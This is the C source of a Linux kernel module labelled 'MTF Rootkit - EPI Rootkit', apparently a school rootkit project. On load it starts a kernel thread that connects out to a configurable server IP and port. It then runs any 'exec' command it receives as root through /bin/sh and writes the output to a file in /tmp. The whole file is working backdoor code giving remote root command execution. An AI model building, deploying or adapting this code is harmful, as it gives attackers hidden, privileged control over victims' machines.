#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#define SUCCESS 0
#define FAILURE 1

static struct socket *sock = NULL;
static struct task_struct *network_thread = NULL;

static char *ip = "127.0.0.1";
static int port = 4242;
static char *message = "Message from epirootkit: connexion established\n";

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "Server IPv4");
MODULE_PARM_DESC(port, "Server port");
MODULE_PARM_DESC(message, "Message to send to the server");

static int close_communication(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
		pr_info("network: socket released\n");
	}
	return SUCCESS;
}

static int exec_str_as_command(char *user_cmd)
{
	struct subprocess_info *sub_info = NULL;
	struct file *file = NULL;
	char *cmd = NULL;
	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	char *output_file = "/tmp/kernel_exec_output";
	char *buf = NULL;
	loff_t pos = 0;
	int status = 0, len = 0;

	cmd = kmalloc(4096, GFP_KERNEL);
	if (!cmd)
		return -ENOMEM;

	snprintf(cmd, 4096, "%s > %s 2>&1", user_cmd, output_file);
	argv[2] = cmd;

	pr_info("kernel_exec: executing command: %s\n", cmd);

	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
	if (!sub_info) {
		kfree(cmd);
		return -ENOMEM;
	}

	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
	pr_info("kernel_exec: command exited with status: %d\n", status);

	file = filp_open(output_file, O_RDONLY, 0);
	if (IS_ERR(file)) {
		kfree(cmd);
		return -ENOENT;
	}

	buf = kmalloc(4096, GFP_KERNEL);
	if (!buf) {
		filp_close(file, NULL);
		kfree(cmd);
		return -ENOMEM;
	}

	len = kernel_read(file, buf, 4096 - 1, &pos);
	if (len >= 0) {
		buf[len] = '\0';
		pr_info("kernel_exec: command output:\n%s", buf);
	}

	filp_close(file, NULL);
	kfree(buf);
	kfree(cmd);
	return 0;
}

static int network_worker(void *data)
{
	struct sockaddr_in addr = { 0 };
	struct msghdr msg = { 0 };
	struct kvec vec = { 0 };
	unsigned char ip_binary[4] = { 0 };
	int ret = 0;

	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
		pr_err("network: invalid IPv4\n");
		return FAILURE;
	}

	ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret < 0) {
		pr_err("network: socket creation failed: %d\n", ret);
		return FAILURE;
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

	while (!kthread_should_stop()) {
		ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
		if (ret < 0) {
			pr_err("network: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret);
			msleep(1000);
			continue;
		}
		break;
	}

	vec.iov_base = (void *)message;
	vec.iov_len = strlen(message);

	do {
		ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
		if (ret < 0) {
			pr_err("network: failed to send message: %d, retrying...\n", ret);
			msleep(1000);
		}
	} while (ret < 0);

	pr_info("network: message sent to %s:%d\n", ip, port);

	// Listen for commands
	while (!kthread_should_stop()) {
		struct kvec recv_vec;
		struct msghdr recv_msg = { 0 };
		char recv_buffer[1024] = { 0 };

		recv_vec.iov_base = recv_buffer;
		recv_vec.iov_len = sizeof(recv_buffer) - 1;

		ret = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
		if (ret < 0) {
			pr_err("network: error receiving message: %d\n", ret);
			msleep(1000);
			continue;
		}

		recv_buffer[ret] = '\0';
		pr_info("network: received: %s", recv_buffer);

		if (strncmp(recv_buffer, "exec ", 5) == 0) {
			char *command = recv_buffer + 5;
			command[strcspn(command, "\n")] = '\0';
			pr_info("network: executing command: %s\n", command);
			exec_str_as_command(command);
		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
			pr_info("network: killcom received, exiting...\n");
			break;
		}
	}

	close_communication();
	return 0;
}

static int __init network_init(void)
{
	pr_info("network: module loaded\n");

	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
	if (IS_ERR(network_thread)) {
		pr_err("network: failed to start thread\n");
		return PTR_ERR(network_thread);
	}

	return SUCCESS;
}

static void __exit network_exit(void)
{
	if (network_thread) {
		kthread_stop(network_thread);
		pr_info("network: thread stopped\n");
	}

	close_communication();
	pr_info("network: module unloaded\n");
}

module_init(network_init);
module_exit(network_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");
MODULE_VERSION("1.0");